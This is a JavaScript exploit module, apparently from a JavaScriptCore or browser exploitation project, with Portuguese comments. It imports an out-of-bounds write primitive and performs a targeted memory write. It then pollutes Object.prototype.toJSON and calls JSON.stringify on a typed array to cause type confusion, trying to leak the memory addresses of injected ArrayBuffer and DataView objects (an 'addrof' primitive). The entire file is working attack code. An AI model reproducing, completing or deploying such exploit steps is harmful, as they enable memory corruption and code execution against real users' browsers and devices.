// js/script3/testArrayBufferVictimCrash.mjs (v41_ExploitTypedArrayProbe)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    JSC_OFFSETS // Importar offsets do JSC para leitura de estruturas
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP = "OriginalHeisenbug_TypedArrayAddrof_v41_ExploitTypedArrayProbe";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;

let leak_target_buffer_v41 = null; // ArrayBuffer para vazar
let leak_target_dataview_v41 = null; // DataView para vazar

let victim_typed_array_ref_v41 = null;
let probe_call_count_v41 = 0;
let all_probe_interaction_details_v41 = [];
let first_call_details_object_ref_v41 = null;

const PROBE_CALL_LIMIT_V41 = 5;

function toJSON_TA_Probe_ExploitTypedArray() {
    probe_call_count_v41++;
    const call_num = probe_call_count_v41;
    let current_call_details = { // Sempre criar um novo objeto de detalhes para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v41_ExploitTypedArray",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v41),
        this_is_C1_details_obj: (this === first_call_details_object_ref_v41 && first_call_details_object_ref_v41 !== null),
        payload_A_assigned: false,
        payload_B_assigned: false,
        error_in_probe: null,
        // Resultados do addrof (se houver) para esta chamada específica
        addrof_result_from_this: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsC1DetailsObj? ${current_call_details.this_is_C1_details_obj}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V41) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit.`, "warn");
            all_probe_interaction_details_v41.push(current_call_details);
            return { recursion_stopped_v41: true, call: call_num };
        }

        // --- Lógica Principal da Sonda ---

        // Caso 1: 'this' é a vítima original (primeira chamada)
        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Creating and returning C1_details object.`, "info");
            first_call_details_object_ref_v41 = current_call_details; // Guarda a referência para C1_details
            all_probe_interaction_details_v41.push(current_call_details);
            return current_call_details;
        }
        // Caso 2: 'this' é o C1_details (type-confused)
        else if (current_call_details.this_is_C1_details_obj && current_call_details.this_type === '[object Object]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: TYPE CONFUSION ON C1_DETAILS_OBJECT ('this')! Attempting to assign leak targets...`, "vuln");

            if (leak_target_buffer_v41) {
                this.payload_A = leak_target_buffer_v41; // Atribui ArrayBuffer
                current_call_details.payload_A_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_buffer_v41 to C1_details.payload_A.`, "info");
            }
            if (leak_target_dataview_v41) {
                this.payload_B = leak_target_dataview_v41; // Atribui DataView
                current_call_details.payload_B_assigned = true;
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Assigned leak_target_dataview_v41 to C1_details.payload_B.`, "info");
            }

            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: C1_details modified. Keys: ${Object.keys(this).join(',')}`, "info");

            all_probe_interaction_details_v41.push(current_call_details);
            return this; // Retornar o 'this' modificado (C1_details modificado)
        }
        // Caso 3: 'this' é o ArrayBuffer ou DataView que injetamos (ou similar)
        else if (current_call_details.this_type === '[object ArrayBuffer]' || current_call_details.this_type === '[object DataView]') {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an INJECTED TYPEDARRAY/ARRAYBUFFER! Attempting to extract pointer! Type: ${current_call_details.this_type}`, "critical");
            let leaked_val = null;
            try {
                // Tentar ler do offset 0 como se fosse um double.
                // Em JSC, objetos são ponteiros marcados. Um JSValue pode ser um double.
                // Se a type confusion desorientou, talvez o início do objeto seja o ponteiro.
                let temp_buffer_for_read = new ArrayBuffer(8); // Usar um novo buffer para evitar tocar o 'this' diretamente
                let temp_float64_view = new Float64Array(temp_buffer_for_read);
                let temp_uint32_view = new Uint32Array(temp_buffer_for_read);

                // Copiar os primeiros 8 bytes de 'this' (ArrayBuffer/DataView) para o temp_buffer
                // Isso pode ser perigoso se 'this' não for um ArrayBuffer ou DataView acessível.
                // Poderíamos usar oob_read_absolute AQUI se tivéssemos o endereço de 'this'.
                // Por enquanto, vamos tentar criar um DataView diretamente sobre 'this' e ler 0x0
                let view_on_this = new DataView(this);
                let low = view_on_this.getUint32(0, true);
                let high = view_on_this.getUint32(4, true);
                leaked_val = new AdvancedInt64(low, high).asFloat64();

                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Attempted read from 'this' at offset 0. Leaked raw value: ${toHex(low)}:${toHex(high)} (as double: ${leaked_val})`, "vuln");
                current_call_details.addrof_result_from_this = leaked_val; // Armazena o valor bruto
                all_probe_interaction_details_v41.push(current_call_details);
                return { leaked_address_v41: leaked_val, leaked_obj_type: current_call_details.this_type }; // Retorna o valor numérico
            } catch (e_leak) {
                logS3(`[${current_call_details.probe_variant}] Call #${call_num}: ERROR during pointer extraction from 'this' (${current_call_details.this_type}): ${e_leak.message}`, "error");
                current_call_details.error_in_probe = e_leak.message;
                all_probe_interaction_details_v41.push(current_call_details);
                return { addrof_error_v41: e_leak.message, type: current_call_details.this_type };
            }
        }
        // Caso 4: Outras chamadas, ou 'this' não é o esperado
        else {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is unexpected. Type: ${current_call_details.this_type}`, "warn");
            all_probe_interaction_details_v41.push(current_call_details);
            return { generic_marker_v41: call_num };
        }

    } catch (e) {
        current_call_details.error_in_probe = e.message;
        logS3(`[${current_call_details.probe_variant}] Call #${call_num}: CRITICAL ERROR in probe: ${e.name} - ${e.message}`, "critical", FNAME_CURRENT_TEST);
        all_probe_interaction_details_v41.push(current_call_details);
        return { error_marker_v41: call_num };
    }
}

export async function executeTypedArrayVictimAddrofTest_ExploitTypedArrayProbe() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP}.triggerAndLog`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (ExploitTypedArrayProbe) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP} Init...`;

    probe_call_count_v41 = 0;
    all_probe_interaction_details_v41 = [];
    victim_typed_array_ref_v41 = null;
    first_call_details_object_ref_v41 = null;

    // Criando os objetos a vazar: um ArrayBuffer e uma DataView
    leak_target_buffer_v41 = new ArrayBuffer(0x10); // Pequeno buffer
    leak_target_dataview_v41 = new DataView(new ArrayBuffer(0x10)); // Pequena DataView

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null;
    let details_of_C1_call_after_modification = null;

    let addrof_A_result = { success: false, msg: "Addrof ArrayBuffer: Default" };
    let addrof_B_result = { success: false, msg: "Addrof DataView: Default" };
    const fillPattern = 0.41414141414141;

    let pollutionApplied = false;
    let originalToJSONDescriptor = null;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed. Value: ${toHex(OOB_WRITE_VALUE)}.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v41 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v41.buffer);
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v41 (Uint8Array) created. Its buffer filled.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ExploitTypedArray, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify(victim_typed_array_ref_v41)...`, "info", FNAME_CURRENT_TEST);
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v41);
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);

            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput);
            } catch (e_parse) {
                logS3(`  Error parsing stringifyOutput: ${e_parse.message}. Output was: ${rawStringifyOutput}`, "warn");
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
            }

            if (first_call_details_object_ref_v41) {
                try {
                    details_of_C1_call_after_modification = JSON.parse(JSON.stringify(first_call_details_object_ref_v41));
                } catch (e_circular) {
                    logS3(`  Warning: Could not capture C1_details snapshot due to circular reference: ${e_circular.message}`, "warn", FNAME_CURRENT_TEST);
                    details_of_C1_call_after_modification = { snapshot_error: e_circular.message };
                }
            }
            logS3(`  EXECUTE: Captured state of C1_details object AFTER all probe calls: ${details_of_C1_call_after_modification ? JSON.stringify(details_of_C1_call_after_modification) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnC1 = false;
            const call2Details = all_probe_interaction_details_v41.find(d => d.call_number === 2);
            if (call2Details && call2Details.this_is_C1_details_obj && call2Details.payload_A_assigned) {
                heisenbugOnC1 = true;
                logS3(`  EXECUTE: HEISENBUG & PAYLOAD ASSIGNMENT on C1_details CONFIRMED by probe Call #2!`, "vuln", FNAME_CURRENT_TEST);
            } else {
                logS3(`  EXECUTE: ALERT: Heisenbug/Payload Assignment on C1_details NOT confirmed as expected by probe Call #2.`, "error", FNAME_CURRENT_TEST);
            }

            logS3("STEP 3: Checking stringifyOutput_parsed for leaked payloads from TypedArray probe...", "warn", FNAME_CURRENT_TEST);
            if (stringifyOutput_parsed && typeof stringifyOutput_parsed === 'object') {
                // Verificar se o outputParsed é um dos objetos vazados pela sonda
                // A sonda retorna { leaked_address_v41: ..., leaked_obj_type: ... }
                if (stringifyOutput_parsed.leaked_address_v41 !== undefined) {
                    const leaked_addr_val = stringifyOutput_parsed.leaked_address_v41;
                    if (typeof leaked_addr_val === 'number' && leaked_addr_val !== 0 && !isNaN(leaked_addr_val)) {
                        let p_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[0], new Uint32Array(new Float64Array([leaked_addr_val]).buffer)[1]);
                        if (p_int64.high() > 0x70000000 || p_int64.low() > 0x10000000 || (p_int64.high() & 0xFF000000) === 0x80000000) {
                            if (stringifyOutput_parsed.leaked_obj_type === '[object ArrayBuffer]') {
                                addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: ArrayBuffer pointer: ${p_int64.toString(true)}`;
                            } else if (stringifyOutput_parsed.leaked_obj_type === '[object DataView]') {
                                addrof_B_result.success = true; addrof_B_result.msg = `SUCCESS: DataView pointer: ${p_int64.toString(true)}`;
                            } else {
                                addrof_A_result.success = true; addrof_A_result.msg = `SUCCESS: Unknown object pointer: ${p_int64.toString(true)} (type: ${stringifyOutput_parsed.leaked_obj_type})`;
                            }
                        } else {
                            addrof_A_result.msg = `Leaked number is not a pointer pattern: ${leaked_addr_val}`;
                        }
                    } else {
                        addrof_A_result.msg = `Leaked value not a useful number: ${JSON.stringify(leaked_addr_val)}`;
                    }
                } else {
                    addrof_A_result.msg = "No 'leaked_address_v41' property found in stringifyOutput_parsed. This means the probe didn't return a pointer.";
                }
            } else {
                addrof_A_result.msg = "stringifyOutput_parsed was not an object or was null.";
            }

            if (addrof_A_result.success || addrof_B_result.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP}: Addr SUCCESS!`;
            } else if (heisenbugOnC1) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP}: C1_TC OK, Addr Fail`;
            } else {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP}: No C1_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  CRITICAL ERROR during JSON.stringify or processing: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP}: Stringify/Log ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
                logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_TEST);
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`  CRITICAL ERROR in main test execution: ${e_outer_main.name} - ${e_outer_main.message}${e_outer_main.stack ? '\n'+e_outer_main.stack : ''}`, "critical", FNAME_CURRENT_TEST);
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V41_ETAP} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v41}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof A: Success=${addrof_A_result.success}, Msg='${addrof_A_result.msg}'`, addrof_A_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof B: Success=${addrof_B_result.success}, Msg='${addrof_B_result.msg}'`, addrof_B_result.success ? "good" : "warn", FNAME_CURRENT_TEST);

        victim_typed_array_ref_v41 = null;
        all_probe_interaction_details_v41 = [];
        probe_call_count_v41 = 0;
        first_call_details_object_ref_v41 = null;
        leak_target_buffer_v41 = null;
        leak_target_dataview_v41 = null;
    }
    return {
        errorCapturedMain: errorCapturedMain,
        potentiallyCrashed: errorCapturedMain?.name === 'RangeError',
        stringifyResult: stringifyOutput_parsed,
        toJSON_details: details_of_C1_call_after_modification,
        all_probe_calls_for_analysis: [...all_probe_interaction_details_v41],
        total_probe_calls: probe_call_count_v41,
        addrof_A_result: addrof_A_result,
        addrof_B_result: addrof_B_result
    };
}
